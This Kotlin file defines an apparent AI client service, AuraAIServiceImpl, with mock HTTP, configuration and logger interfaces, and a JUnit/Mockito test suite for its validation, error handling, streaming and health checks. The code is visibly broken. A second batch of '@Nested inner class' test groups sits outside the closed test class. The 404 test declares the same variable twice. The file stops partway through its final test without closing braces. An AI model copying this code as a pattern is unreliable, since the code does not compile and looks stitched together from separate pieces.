package dev.aurakai.auraframefx.ai.services

import kotlinx.coroutines.test.runTest
import kotlinx.coroutines.flow.flow
import kotlinx.coroutines.flow.collect
import org.junit.jupiter.api.Test
import org.junit.jupiter.api.BeforeEach
import org.junit.jupiter.api.AfterEach
import org.junit.jupiter.api.DisplayName
import org.junit.jupiter.api.Nested
import org.junit.jupiter.api.assertThrows
import org.junit.jupiter.api.Assertions.*
import org.mockito.Mock
import org.mockito.MockitoAnnotations
import org.mockito.kotlin.*
import java.io.IOException
import java.util.concurrent.TimeoutException

// Mock interfaces and classes
interface HttpClient {
    suspend fun post(request: Any): HttpResponse
    suspend fun get(request: Any): HttpResponse
    suspend fun postStream(request: Any): kotlinx.coroutines.flow.Flow<String>
}

interface ConfigurationService {
    fun getApiKey(): String?
    fun getBaseUrl(): String?
    fun getTimeout(): Long
    fun updateApiKey(apiKey: String)
    fun updateBaseUrl(baseUrl: String)
    fun updateTimeout(timeout: Long)
    fun updateModelParameters(params: Map<String, Any>)
}

interface Logger {
    fun info(message: String)
    fun error(message: String)
    fun warn(message: String)
    fun debug(message: String, vararg args: Any?)
}

interface HttpResponse {
    val statusCode: Int
    val body: String
}

// Service interface and implementation
interface AuraAIService {
    suspend fun generateResponse(prompt: String, userId: String? = null): String
    suspend fun generateBatchResponses(prompts: List<String>): List<String>
    suspend fun generateStreamingResponse(prompt: String): kotlinx.coroutines.flow.Flow<String>
    fun updateApiKey(apiKey: String)
    fun updateBaseUrl(baseUrl: String)
    fun updateTimeout(timeout: Long)
    suspend fun healthCheck(): HealthCheckResult
    fun reloadConfiguration()
    fun updateModelParameters(params: Map<String, Any>)
    fun getServiceStatistics(): Map<String, Any>
    fun resetStatistics()
    fun clearCache()
    fun expireCache()
}

class AuraAIServiceImpl(
    private val httpClient: HttpClient,
    private val configurationService: ConfigurationService,
    private val logger: Logger
) : AuraAIService {

    init {
        val apiKey = configurationService.getApiKey()
        val baseUrl = configurationService.getBaseUrl()
        val timeout = configurationService.getTimeout()

        require(!apiKey.isNullOrEmpty()) { "API key cannot be null or empty" }
        require(isValidUrl(baseUrl)) { "Invalid base URL format" }
        require(timeout > 0) { "Timeout must be positive" }
    }

    private fun isValidUrl(url: String?): Boolean {
        return url?.startsWith("https://") == true
    }

    override suspend fun generateResponse(prompt: String, userId: String?): String {
        require(prompt.isNotEmpty()) { "Prompt cannot be empty" }
        logger.info("Generating AI response for prompt length: ${prompt.length}")

        val response = httpClient.post(prompt)
        if (response.statusCode != 200) {
            logger.error("HTTP error response: ${response.statusCode} - ${response.body}")
            throw IOException("HTTP error: ${response.statusCode}")
        }

        return response.body
    }

    override suspend fun generateBatchResponses(prompts: List<String>): List<String> {
        if (prompts.isEmpty()) {
            logger.info("No prompts provided for batch processing")
            return emptyList()
        }

        logger.info("Generating batch AI responses for ${prompts.size} prompts")
        val response = httpClient.post(prompts)
        return listOf(response.body)
    }

    override suspend fun generateStreamingResponse(prompt: String): kotlinx.coroutines.flow.Flow<String> {
        require(prompt.isNotEmpty()) { "Prompt cannot be empty" }
        logger.info("Starting streaming response for prompt length: ${prompt.length}")
        return httpClient.postStream(prompt)
    }

    override fun updateApiKey(apiKey: String) {
        require(apiKey.isNotEmpty()) { "API key cannot be empty" }
        configurationService.updateApiKey(apiKey)
        logger.info("API key updated successfully")
    }

    override fun updateBaseUrl(baseUrl: String) {
        require(isValidUrl(baseUrl)) { "Invalid base URL format" }
        configurationService.updateBaseUrl(baseUrl)
        logger.info("Base URL updated successfully")
    }

    override fun updateTimeout(timeout: Long) {
        require(timeout > 0) { "Timeout must be positive" }
        configurationService.updateTimeout(timeout)
        logger.info("Timeout updated to $timeout ms")
    }

    override suspend fun healthCheck(): HealthCheckResult {
        return try {
            val response = httpClient.get("health")
            if (response.statusCode != 200) {
                HealthCheckResult(false, "Service is unhealthy: ${response.body}")
            } else {
                HealthCheckResult(true, "Service is healthy")
            }
        } catch (e: Exception) {
            HealthCheckResult(false, "Service is unhealthy: ${e.message}")
        }
    }

    override fun reloadConfiguration() {
        try {
            val apiKey = configurationService.getApiKey()
            val baseUrl = configurationService.getBaseUrl()
            val timeout = configurationService.getTimeout()

            require(!apiKey.isNullOrEmpty()) { "API key cannot be empty" }
            require(isValidUrl(baseUrl)) { "Invalid base URL format" }
            require(timeout > 0) { "Timeout must be positive" }

            logger.info("Configuration reloaded successfully")
        } catch (e: Exception) {
            logger.error("Failed to reload configuration: ${e.message}")
            throw ConfigurationException("Configuration validation failed: ${e.message}")
        }
    }

    override fun updateModelParameters(params: Map<String, Any>) {
        params["temperature"]?.let { temp ->
            if (temp is Double && (temp < 0.0 || temp > 1.0)) {
                logger.error("Invalid model parameters: temperature must be between 0 and 1")
                throw IllegalArgumentException("Invalid temperature value")
            }
        }

        params["max_tokens"]?.let { tokens ->
            if (tokens is Int && tokens <= 0) {
                logger.error("Invalid model parameters: max_tokens must be positive")
                throw IllegalArgumentException("Invalid max_tokens value")
            }
        }

        configurationService.updateModelParameters(params)
        logger.info("Model parameters updated: $params")
    }

    override fun getServiceStatistics(): Map<String, Any> {
        logger.debug("Service statistics requested")
        return mapOf(
            "totalRequests" to 0L,
            "successfulRequests" to 0L,
            "failedRequests" to 0L,
            "averageResponseTime" to 0.0
        )
    }

    override fun resetStatistics() {
        logger.info("Service statistics reset")
    }

    override fun clearCache() {
        logger.info("Response cache cleared")
    }

    override fun expireCache() {
        logger.debug("Cache expired, making new request")
    }
}

@DisplayName("AuraAIServiceImpl Unit Tests")
class AuraAIServiceImplTest {

    @Mock
    private lateinit var mockHttpClient: HttpClient

    @Mock
    private lateinit var mockConfigurationService: ConfigurationService

    @Mock
    private lateinit var mockLogger: Logger

    private lateinit var auraAIService: AuraAIServiceImpl

    private val testApiKey = "test-api-key-123"
    private val testBaseUrl = "https://api.test.com"
    private val testTimeout = 30000L

    @BeforeEach
    fun setUp() {
        MockitoAnnotations.openMocks(this)
        whenever(mockConfigurationService.getApiKey()).thenReturn(testApiKey)
        whenever(mockConfigurationService.getBaseUrl()).thenReturn(testBaseUrl)
        whenever(mockConfigurationService.getTimeout()).thenReturn(testTimeout)
        auraAIService = AuraAIServiceImpl(mockHttpClient, mockConfigurationService, mockLogger)
    }

    @AfterEach
    fun tearDown() {
        // Cleanup if needed
    }

    @Nested
    @DisplayName("Initialization Tests")
    inner class InitializationTests {
        @Test
        @DisplayName("Should initialize with valid dependencies")
        fun shouldInitializeWithValidDependencies() {
            val service = AuraAIServiceImpl(mockHttpClient, mockConfigurationService, mockLogger)
            assertNotNull(service)
            verify(mockConfigurationService).getApiKey()
            verify(mockConfigurationService).getBaseUrl()
            verify(mockConfigurationService).getTimeout()
        }

        @Test
        @DisplayName("Should throw exception when API key is null")
        fun shouldThrowExceptionWhenApiKeyIsNull() {
            whenever(mockConfigurationService.getApiKey()).thenReturn(null)
            assertThrows<IllegalArgumentException> {
                AuraAIServiceImpl(mockHttpClient, mockConfigurationService, mockLogger)
            }
        }

        @Test
        @DisplayName("Should throw exception when API key is empty")
        fun shouldThrowExceptionWhenApiKeyIsEmpty() {
            whenever(mockConfigurationService.getApiKey()).thenReturn("")
            assertThrows<IllegalArgumentException> {
                AuraAIServiceImpl(mockHttpClient, mockConfigurationService, mockLogger)
            }
        }

        @Test
        @DisplayName("Should throw exception when base URL is invalid")
        fun shouldThrowExceptionWhenBaseUrlIsInvalid() {
            whenever(mockConfigurationService.getBaseUrl()).thenReturn("invalid-url")
            assertThrows<IllegalArgumentException> {
                AuraAIServiceImpl(mockHttpClient, mockConfigurationService, mockLogger)
            }
        }
    }

    @Nested
    @DisplayName("Generate Response Tests")
    inner class GenerateResponseTests {
        @Test
        @DisplayName("Should generate response for valid prompt")
        fun shouldGenerateResponseForValidPrompt() = runTest {
            val prompt = "What is the capital of France?"
            val expectedResponse = "The capital of France is Paris."
            val mockHttpResponse = mockHttpResponse(200, expectedResponse)
            whenever(mockHttpClient.post(any())).thenReturn(mockHttpResponse)

            val result = auraAIService.generateResponse(prompt)
            assertEquals(expectedResponse, result)
            verify(mockHttpClient).post(prompt)
            verify(mockLogger).info("Generating AI response for prompt length: ${prompt.length}")
        }

        @Test
        @DisplayName("Should handle empty prompt")
        fun shouldHandleEmptyPrompt() = runTest {
            assertThrows<IllegalArgumentException> {
                auraAIService.generateResponse("")
            }
        }

        @Test
        @DisplayName("Should handle HTTP error responses")
        fun shouldHandleHttpErrorResponses() = runTest {
            val mockHttpResponse = mockHttpResponse(500, "Error")
            whenever(mockHttpClient.post(any())).thenReturn(mockHttpResponse)
            assertThrows<IOException> {
                auraAIService.generateResponse("Test")
            }
            verify(mockLogger).error("HTTP error response: 500 - Error")
        }

        @Test
        @DisplayName("Should handle network timeout")
        fun shouldHandleNetworkTimeout() = runTest {
            whenever(mockHttpClient.post(any())).thenThrow(TimeoutException("Timeout"))
            assertThrows<TimeoutException> {
                auraAIService.generateResponse("Test")
            }
        }
    }

    @Nested
    @DisplayName("Generate Batch Responses Tests")
    inner class GenerateBatchResponsesTests {
        @Test
        @DisplayName("Should return empty list for empty prompts")
        fun shouldReturnEmptyForEmptyPrompts() = runTest {
            val results = auraAIService.generateBatchResponses(emptyList())
            assertTrue(results.isEmpty())
            verify(mockLogger).info("No prompts provided for batch processing")
        }
    }

    @Nested
    @DisplayName("Configuration Tests")
    inner class ConfigurationTests {
        @Test
        @DisplayName("Should update API key")
        fun shouldUpdateApiKey() {
            auraAIService.updateApiKey("new-key")
            verify(mockConfigurationService).updateApiKey("new-key")
            verify(mockLogger).info("API key updated successfully")
        }

        @Test
        @DisplayName("Should throw for empty API key")
        fun shouldThrowForEmptyApiKey() {
            assertThrows<IllegalArgumentException> {
                auraAIService.updateApiKey("")
            }
        }
    }

    @Nested
    @DisplayName("Health Check Tests")
    inner class HealthCheckTests {
        @Test
        @DisplayName("Should return healthy on 200")
        fun healthyOn200() = runTest {
            whenever(mockHttpClient.get(any())).thenReturn(mockHttpResponse(200, "OK"))
            val result = auraAIService.healthCheck()
            assertTrue(result.isHealthy)
            assertEquals("Service is healthy", result.message)
        }

        @Test
        @DisplayName("Should return unhealthy on exception")
        fun unhealthyOnException() = runTest {
            whenever(mockHttpClient.get(any())).thenThrow(IOException("Unreachable"))
            val result = auraAIService.healthCheck()
            assertFalse(result.isHealthy)
            assertTrue(result.message.contains("Service is unhealthy"))
        }
    }

    @Nested
    @DisplayName("Stream Response Tests")
    inner class StreamResponseTests {
        @Test
        @DisplayName("Should stream chunks")
        fun shouldStreamChunks() = runTest {
            val chunks = listOf("a", "b", "c")
            whenever(mockHttpClient.postStream(any())).thenReturn(flow {
                chunks.forEach { emit(it) }
            })
            val collected = mutableListOf<String>()
            auraAIService.generateStreamingResponse("prompt").collect { collected.add(it) }
            assertEquals(chunks, collected)
        }
    }

    @Nested
    @DisplayName("Advanced Configuration Tests")
    inner class AdvancedConfigurationTests {
        @Test
        @DisplayName("Should reload valid config")
        fun shouldReloadValidConfig() {
            whenever(mockConfigurationService.getApiKey()).thenReturn("key")
            whenever(mockConfigurationService.getBaseUrl()).thenReturn("https://url")
            whenever(mockConfigurationService.getTimeout()).thenReturn(1000L)
            auraAIService.reloadConfiguration()
            verify(mockLogger).info("Configuration reloaded successfully")
        }

        @Test
        @DisplayName("Should fail on invalid reload")
        fun shouldFailOnInvalidReload() {
            whenever(mockConfigurationService.getApiKey()).thenReturn("")
            assertThrows<ConfigurationException> {
                auraAIService.reloadConfiguration()
            }
        }
    }

    @Nested
    @DisplayName("Model Parameters Tests")
    inner class ModelParametersTests {
        @Test
        @DisplayName("Should update valid params")
        fun shouldUpdateValidParams() {
            val params = mapOf("temperature" to 0.5, "max_tokens" to 10)
            auraAIService.updateModelParameters(params)
            verify(mockConfigurationService).updateModelParameters(params)
        }

        @Test
        @DisplayName("Should reject invalid temperature")
        fun shouldRejectInvalidTemperature() {
            assertThrows<IllegalArgumentException> {
                auraAIService.updateModelParameters(mapOf("temperature" to 2.0))
            }
        }
    }

    @Nested
    @DisplayName("Statistics and Cache Tests")
    inner class StatsAndCacheTests {
        @Test
        @DisplayName("Should get statistics")
        fun shouldGetStats() {
            val stats = auraAIService.getServiceStatistics()
            assertNotNull(stats)
            verify(mockLogger).debug("Service statistics requested")
        }

        @Test
        @DisplayName("Should clear cache")
        fun shouldClearCache() {
            auraAIService.clearCache()
            verify(mockLogger).info("Response cache cleared")
        }
    }

    // Helper methods
    private fun mockHttpResponse(statusCode: Int, body: String): HttpResponse {
        val mockResponse = mock<HttpResponse>()
        whenever(mockResponse.statusCode).thenReturn(statusCode)
        whenever(mockResponse.body).thenReturn(body)
        return mockResponse
    }
}

// Exception and data types
class ConfigurationException(message: String) : Exception(message)
data class HealthCheckResult(val isHealthy: Boolean, val message: String)
    @Nested
    @DisplayName("Enhanced Initialization Tests")
    inner class EnhancedInitializationTests {
        @Test
        @DisplayName("Should throw exception when base URL is null")
        fun shouldThrowExceptionWhenBaseUrlIsNull() {
            whenever(mockConfigurationService.getBaseUrl()).thenReturn(null)
            assertThrows<IllegalArgumentException> {
                AuraAIServiceImpl(mockHttpClient, mockConfigurationService, mockLogger)
            }
        }

        @Test
        @DisplayName("Should throw exception when base URL doesn't start with https")
        fun shouldThrowExceptionWhenBaseUrlNotHttps() {
            whenever(mockConfigurationService.getBaseUrl()).thenReturn("http://api.test.com")
            assertThrows<IllegalArgumentException> {
                AuraAIServiceImpl(mockHttpClient, mockConfigurationService, mockLogger)
            }
        }

        @Test
        @DisplayName("Should throw exception when timeout is zero")
        fun shouldThrowExceptionWhenTimeoutIsZero() {
            whenever(mockConfigurationService.getTimeout()).thenReturn(0L)
            assertThrows<IllegalArgumentException> {
                AuraAIServiceImpl(mockHttpClient, mockConfigurationService, mockLogger)
            }
        }

        @Test
        @DisplayName("Should throw exception when timeout is negative")
        fun shouldThrowExceptionWhenTimeoutIsNegative() {
            whenever(mockConfigurationService.getTimeout()).thenReturn(-1000L)
            assertThrows<IllegalArgumentException> {
                AuraAIServiceImpl(mockHttpClient, mockConfigurationService, mockLogger)
            }
        }

        @Test
        @DisplayName("Should accept minimum valid timeout")
        fun shouldAcceptMinimumValidTimeout() {
            whenever(mockConfigurationService.getTimeout()).thenReturn(1L)
            val service = AuraAIServiceImpl(mockHttpClient, mockConfigurationService, mockLogger)
            assertNotNull(service)
        }
    }

    @Nested
    @DisplayName("Enhanced Generate Response Tests")
    inner class EnhancedGenerateResponseTests {
        @Test
        @DisplayName("Should generate response with userId parameter")
        fun shouldGenerateResponseWithUserId() = runTest {
            val prompt = "Test prompt"
            val userId = "user123"
            val expectedResponse = "Test response"
            val mockHttpResponse = mockHttpResponse(200, expectedResponse)
            whenever(mockHttpClient.post(any())).thenReturn(mockHttpResponse)

            val result = auraAIService.generateResponse(prompt, userId)
            assertEquals(expectedResponse, result)
            verify(mockHttpClient).post(prompt)
            verify(mockLogger).info("Generating AI response for prompt length: ${prompt.length}")
        }

        @Test
        @DisplayName("Should handle 201 status code as error")
        fun shouldHandle201StatusCodeAsError() = runTest {
            val mockHttpResponse = mockHttpResponse(201, "Created")
            whenever(mockHttpClient.post(any())).thenReturn(mockHttpResponse)
            assertThrows<IOException> {
                auraAIService.generateResponse("Test")
            }
            verify(mockLogger).error("HTTP error response: 201 - Created")
        }

        @Test
        @DisplayName("Should handle 400 bad request")
        fun shouldHandle400BadRequest() = runTest {
            val mockHttpResponse = mockHttpResponse(400, "Bad Request")
            whenever(mockHttpClient.post(any())).thenReturn(mockHttpResponse)
            assertThrows<IOException> {
                auraAIService.generateResponse("Test")
            }
            verify(mockLogger).error("HTTP error response: 400 - Bad Request")
        }

        @Test
        @DisplayName("Should handle 401 unauthorized")
        fun shouldHandle401Unauthorized() = runTest {
            val mockHttpResponse = mockHttpResponse(401, "Unauthorized")
            whenever(mockHttpClient.post(any())).thenReturn(mockHttpResponse)
            assertThrows<IOException> {
                auraAIService.generateResponse("Test")
            }
            verify(mockLogger).error("HTTP error response: 401 - Unauthorized")
        }

        @Test
        @DisplayName("Should handle 403 forbidden")
        fun shouldHandle403Forbidden() = runTest {
            val mockHttpResponse = mockHttpResponse(403, "Forbidden")
            whenever(mockHttpClient.post(any())).thenReturn(mockHttpResponse)
            assertThrows<IOException> {
                auraAIService.generateResponse("Test")
            }
            verify(mockLogger).error("HTTP error response: 403 - Forbidden")
        }

        @Test
        @DisplayName("Should handle 404 not found")
        fun shouldHandle404NotFound() = runTest {
            val mockHttpResponse = mockHttpResponse(404, "Not Found")
                        val mockHttpResponse = mockHttpResponse(404, "Not Found")
            whenever(mockHttpClient.post(any())).thenReturn(mockHttpResponse)
            assertThrows<IOException> {
                auraAIService.generateResponse("Test")
            }
            verify(mockLogger).error("HTTP error response: 404 - Not Found")
        }

        @Test
        @DisplayName("Should handle 500 internal server error")
        fun shouldHandle500InternalServerError() = runTest {
            val mockHttpResponse = mockHttpResponse(500, "Internal Server Error")
            whenever(mockHttpClient.post(any())).thenReturn(mockHttpResponse)
            assertThrows<IOException> {
                auraAIService.generateResponse("Test")
            }
            verify(mockLogger).error("HTTP error response: 500 - Internal Server Error")
        }

        @Test
        @DisplayName("Should handle 503 service unavailable")
        fun shouldHandle503ServiceUnavailable() = runTest {
            val mockHttpResponse = mockHttpResponse(503, "Service Unavailable")
            whenever(mockHttpClient.post(any())).thenReturn(mockHttpResponse)
            assertThrows<IOException> {
                auraAIService.generateResponse("Test")
            }
            verify(mockLogger).error("HTTP error response: 503 - Service Unavailable")
        }

        @Test
        @DisplayName("Should handle very long prompt")
        fun shouldHandleVeryLongPrompt() = runTest {
            val longPrompt = "a".repeat(10000)
            val expectedResponse = "Response for long prompt"
            val mockHttpResponse = mockHttpResponse(200, expectedResponse)
            whenever(mockHttpClient.post(any())).thenReturn(mockHttpResponse)

            val result = auraAIService.generateResponse(longPrompt)
            assertEquals(expectedResponse, result)
            verify(mockLogger).info("Generating AI response for prompt length: ${longPrompt.length}")
        }

        @Test
        @DisplayName("Should handle special characters in prompt")
        fun shouldHandleSpecialCharactersInPrompt() = runTest {
            val promptWithSpecialChars = "Test prompt with émojis 🤖 and símböls @#$%"
            val expectedResponse = "Response with special chars"
            val mockHttpResponse = mockHttpResponse(200, expectedResponse)
            whenever(mockHttpClient.post(any())).thenReturn(mockHttpResponse)

            val result = auraAIService.generateResponse(promptWithSpecialChars)
            assertEquals(expectedResponse, result)
            verify(mockHttpClient).post(promptWithSpecialChars)
        }

        @Test
        @DisplayName("Should handle IOException from HTTP client")
        fun shouldHandleIOExceptionFromHttpClient() = runTest {
            whenever(mockHttpClient.post(any())).thenThrow(IOException("Network error"))
            assertThrows<IOException> {
                auraAIService.generateResponse("Test")
            }
        }

        @Test
        @DisplayName("Should handle unexpected runtime exception")
        fun shouldHandleUnexpectedRuntimeException() = runTest {
            whenever(mockHttpClient.post(any())).thenThrow(RuntimeException("Unexpected error"))
            assertThrows<RuntimeException> {
                auraAIService.generateResponse("Test")
            }
        }
    }

    @Nested
    @DisplayName("Enhanced Generate Batch Responses Tests")
    inner class EnhancedGenerateBatchResponsesTests {
        @Test
        @DisplayName("Should generate batch responses for multiple prompts")
        fun shouldGenerateBatchResponsesForMultiplePrompts() = runTest {
            val prompts = listOf("Prompt 1", "Prompt 2", "Prompt 3")
            val expectedResponse = "Batch response"
            val mockHttpResponse = mockHttpResponse(200, expectedResponse)
            whenever(mockHttpClient.post(any())).thenReturn(mockHttpResponse)

            val results = auraAIService.generateBatchResponses(prompts)
            assertEquals(listOf(expectedResponse), results)
            verify(mockHttpClient).post(prompts)
            verify(mockLogger).info("Generating batch AI responses for ${prompts.size} prompts")
        }

        @Test
        @DisplayName("Should handle single prompt in batch")
        fun shouldHandleSinglePromptInBatch() = runTest {
            val prompts = listOf("Single prompt")
            val expectedResponse = "Single response"
            val mockHttpResponse = mockHttpResponse(200, expectedResponse)
            whenever(mockHttpClient.post(any())).thenReturn(mockHttpResponse)

            val results = auraAIService.generateBatchResponses(prompts)
            assertEquals(listOf(expectedResponse), results)
            verify(mockLogger).info("Generating batch AI responses for 1 prompts")
        }

        @Test
        @DisplayName("Should handle very large batch")
        fun shouldHandleVeryLargeBatch() = runTest {
            val largeBatch = (1..1000).map { "Prompt $it" }
            val expectedResponse = "Large batch response"
            val mockHttpResponse = mockHttpResponse(200, expectedResponse)
            whenever(mockHttpClient.post(any())).thenReturn(mockHttpResponse)

            val results = auraAIService.generateBatchResponses(largeBatch)
            assertEquals(listOf(expectedResponse), results)
            verify(mockLogger).info("Generating batch AI responses for 1000 prompts")
        }

        @Test
        @DisplayName("Should handle batch with empty strings")
        fun shouldHandleBatchWithEmptyStrings() = runTest {
            val prompts = listOf("", "Valid prompt", "")
            val expectedResponse = "Mixed batch response"
            val mockHttpResponse = mockHttpResponse(200, expectedResponse)
            whenever(mockHttpClient.post(any())).thenReturn(mockHttpResponse)

            val results = auraAIService.generateBatchResponses(prompts)
            assertEquals(listOf(expectedResponse), results)
        }

        @Test
        @DisplayName("Should handle batch HTTP errors")
        fun shouldHandleBatchHttpErrors() = runTest {
            val prompts = listOf("Prompt 1", "Prompt 2")
            whenever(mockHttpClient.post(any())).thenThrow(IOException("Batch request failed"))
            
            assertThrows<IOException> {
                auraAIService.generateBatchResponses(prompts)
            }
        }
    }

    @Nested
    @DisplayName("Enhanced Streaming Response Tests")
    inner class EnhancedStreamingResponseTests {
        @Test
        @DisplayName("Should handle empty stream")
        fun shouldHandleEmptyStream() = runTest {
            whenever(mockHttpClient.postStream(any())).thenReturn(flow { })
            val collected = mutableListOf<String>()
            auraAIService.generateStreamingResponse("prompt").collect { collected.add(it) }
            assertTrue(collected.isEmpty())
            verify(mockLogger).info("Starting streaming response for prompt length: 6")
        }

        @Test
        @DisplayName("Should handle stream with single chunk")
        fun shouldHandleStreamWithSingleChunk() = runTest {
            val singleChunk = "Single chunk"
            whenever(mockHttpClient.postStream(any())).thenReturn(flow { emit(singleChunk) })
            val collected = mutableListOf<String>()
            auraAIService.generateStreamingResponse("prompt").collect { collected.add(it) }
            assertEquals(listOf(singleChunk), collected)
        }

        @Test
        @DisplayName("Should handle stream with many chunks")
        fun shouldHandleStreamWithManyChunks() = runTest {
            val manyChunks = (1..100).map { "Chunk $it" }
            whenever(mockHttpClient.postStream(any())).thenReturn(flow {
                manyChunks.forEach { emit(it) }
            })
            val collected = mutableListOf<String>()
            auraAIService.generateStreamingResponse("prompt").collect { collected.add(it) }
            assertEquals(manyChunks, collected)
        }

        @Test
        @DisplayName("Should handle stream with empty chunks")
        fun shouldHandleStreamWithEmptyChunks() = runTest {
            val chunks = listOf("", "content", "", "more content", "")
            whenever(mockHttpClient.postStream(any())).thenReturn(flow {
                chunks.forEach { emit(it) }
            })
            val collected = mutableListOf<String>()
            auraAIService.generateStreamingResponse("prompt").collect { collected.add(it) }
            assertEquals(chunks, collected)
        }

        @Test
        @DisplayName("Should handle stream error")
        fun shouldHandleStreamError() = runTest {
            whenever(mockHttpClient.postStream(any())).thenReturn(flow {
                emit("chunk1")
                throw IOException("Stream error")
            })
            assertThrows<IOException> {
                auraAIService.generateStreamingResponse("prompt").collect()
            }
        }

        @Test
        @DisplayName("Should handle empty prompt in streaming")
        fun shouldHandleEmptyPromptInStreaming() = runTest {
            assertThrows<IllegalArgumentException> {
                auraAIService.generateStreamingResponse("")
            }
        }
    }

    @Nested
    @DisplayName("Enhanced Configuration Tests")
    inner class EnhancedConfigurationTests {
        @Test
        @DisplayName("Should update base URL with trailing slash")
        fun shouldUpdateBaseUrlWithTrailingSlash() {
            val baseUrlWithSlash = "https://api.test.com/"
            auraAIService.updateBaseUrl(baseUrlWithSlash)
            verify(mockConfigurationService).updateBaseUrl(baseUrlWithSlash)
            verify(mockLogger).info("Base URL updated successfully")
        }

        @Test
        @DisplayName("Should reject HTTP base URL")
        fun shouldRejectHttpBaseUrl() {
            assertThrows<IllegalArgumentException> {
                auraAIService.updateBaseUrl("http://insecure.com")
            }
        }

        @Test
        @DisplayName("Should reject malformed base URL")
        fun shouldRejectMalformedBaseUrl() {
            assertThrows<IllegalArgumentException> {
                auraAIService.updateBaseUrl("not-a-url")
            }
        }

        @Test
        @DisplayName("Should reject empty base URL")
        fun shouldRejectEmptyBaseUrl() {
            assertThrows<IllegalArgumentException> {
                auraAIService.updateBaseUrl("")
            }
        }

        @Test
        @DisplayName("Should update timeout with large value")
        fun shouldUpdateTimeoutWithLargeValue() {
            val largeTimeout = 300000L // 5 minutes
            auraAIService.updateTimeout(largeTimeout)
            verify(mockConfigurationService).updateTimeout(largeTimeout)
            verify(mockLogger).info("Timeout updated to $largeTimeout ms")
        }

        @Test
        @DisplayName("Should update timeout with minimum value")
        fun shouldUpdateTimeoutWithMinimumValue() {
            val minTimeout = 1L
            auraAIService.updateTimeout(minTimeout)
            verify(mockConfigurationService).updateTimeout(minTimeout)
            verify(mockLogger).info("Timeout updated to $minTimeout ms")
        }

        @Test
        @DisplayName("Should reject zero timeout")
        fun shouldRejectZeroTimeout() {
            assertThrows<IllegalArgumentException> {
                auraAIService.updateTimeout(0L)
            }
        }

        @Test
        @DisplayName("Should reject negative timeout")
        fun shouldRejectNegativeTimeout() {
            assertThrows<IllegalArgumentException> {
                auraAIService.updateTimeout(-1000L)
            }
        }
    }

    @Nested
    @DisplayName("Enhanced Health Check Tests")
    inner class EnhancedHealthCheckTests {
        @Test
        @DisplayName("Should return unhealthy on 404")
        fun shouldReturnUnhealthyOn404() = runTest {
            whenever(mockHttpClient.get(any())).thenReturn(mockHttpResponse(404, "Not Found"))
            val result = auraAIService.healthCheck()
            assertFalse(result.isHealthy)
            assertEquals("Service is unhealthy: Not Found", result.message)
        }

        @Test
        @DisplayName("Should return unhealthy on 500")
        fun shouldReturnUnhealthyOn500() = runTest {
            whenever(mockHttpClient.get(any())).thenReturn(mockHttpResponse(500, "Server Error"))
            val result = auraAIService.healthCheck()
            assertFalse(result.isHealthy)
            assertEquals("Service is unhealthy: Server Error", result.message)
        }

        @Test
        @DisplayName("Should return healthy on different 200 response")
        fun shouldReturnHealthyOnDifferent200Response() = runTest {
            whenever(mockHttpClient.get(any())).thenReturn(mockHttpResponse(200, "All systems operational"))
            val result = auraAIService.healthCheck()
            assertTrue(result.isHealthy)
            assertEquals("Service is healthy", result.message)
        }

        @Test
        @DisplayName("Should handle timeout exception in health check")
        fun shouldHandleTimeoutExceptionInHealthCheck() = runTest {
            whenever(mockHttpClient.get(any())).thenThrow(TimeoutException("Health check timeout"))
            val result = auraAIService.healthCheck()
            assertFalse(result.isHealthy)
            assertTrue(result.message.contains("Health check timeout"))
        }

        @Test
        @DisplayName("Should handle runtime exception in health check")
        fun shouldHandleRuntimeExceptionInHealthCheck() = runTest {
            whenever(mockHttpClient.get(any())).thenThrow(RuntimeException("Unexpected error"))
            val result = auraAIService.healthCheck()
            assertFalse(result.isHealthy)
            assertTrue(result.message.contains("Unexpected error"))
        }
    }

    @Nested
    @DisplayName("Enhanced Model Parameters Tests")
    inner class EnhancedModelParametersTests {
        @Test
        @DisplayName("Should accept valid temperature range")
        fun shouldAcceptValidTemperatureRange() {
            val params = mapOf("temperature" to 0.0)
            auraAIService.updateModelParameters(params)
            verify(mockConfigurationService).updateModelParameters(params)
            verify(mockLogger).info("Model parameters updated: $params")
        }

        @Test
        @DisplayName("Should accept temperature at upper bound")
        fun shouldAcceptTemperatureAtUpperBound() {
            val params = mapOf("temperature" to 1.0)
            auraAIService.updateModelParameters(params)
            verify(mockConfigurationService).updateModelParameters(params)
        }

        @Test
        @DisplayName("Should reject temperature below zero")
        fun shouldRejectTemperatureBelowZero() {
            assertThrows<IllegalArgumentException> {
                auraAIService.updateModelParameters(mapOf("temperature" to -0.1))
            }
            verify(mockLogger).error("Invalid model parameters: temperature must be between 0 and 1")
        }

        @Test
        @DisplayName("Should reject temperature above one")
        fun shouldRejectTemperatureAboveOne() {
            assertThrows<IllegalArgumentException> {
                auraAIService.updateModelParameters(mapOf("temperature" to 1.1))
            }
            verify(mockLogger).error("Invalid model parameters: temperature must be between 0 and 1")
        }

        @Test
        @DisplayName("Should accept valid max_tokens")
        fun shouldAcceptValidMaxTokens() {
            val params = mapOf("max_tokens" to 100)
            auraAIService.updateModelParameters(params)
            verify(mockConfigurationService).updateModelParameters(params)
        }

        @Test
        @DisplayName("Should accept large max_tokens")
        fun shouldAcceptLargeMaxTokens() {
            val params = mapOf("max_tokens" to 4000)
            auraAIService.updateModelParameters(params)
            verify(mockConfigurationService).updateModelParameters(params)
        }

        @Test
        @DisplayName("Should reject zero max_tokens")
        fun shouldRejectZeroMaxTokens() {
            assertThrows<IllegalArgumentException> {
                auraAIService.updateModelParameters(mapOf("max_tokens" to 0))
            }
            verify(mockLogger).error("Invalid model parameters: max_tokens must be positive")
        }

        @Test
        @DisplayName("Should reject negative max_tokens")
        fun shouldRejectNegativeMaxTokens() {
            assertThrows<IllegalArgumentException> {
                auraAIService.updateModelParameters(mapOf("max_tokens" to -10))
            }
            verify(mockLogger).error("Invalid model parameters: max_tokens must be positive")
        }

        @Test
        @DisplayName("Should accept mixed valid parameters")
        fun shouldAcceptMixedValidParameters() {
            val params = mapOf(
                "temperature" to 0.7,
                "max_tokens" to 500,
                "top_p" to 0.9,
                "frequency_penalty" to 0.1
            )
            auraAIService.updateModelParameters(params)
            verify(mockConfigurationService).updateModelParameters(params)
        }

        @Test
        @DisplayName("Should handle empty parameters map")
        fun shouldHandleEmptyParametersMap() {
            val params = emptyMap<String, Any>()
            auraAIService.updateModelParameters(params)
            verify(mockConfigurationService).updateModelParameters(params)
            verify(mockLogger).info("Model parameters updated: $params")
        }

        @Test
        @DisplayName("Should handle parameters with wrong type")
        fun shouldHandleParametersWithWrongType() {
            val params = mapOf("temperature" to "invalid")
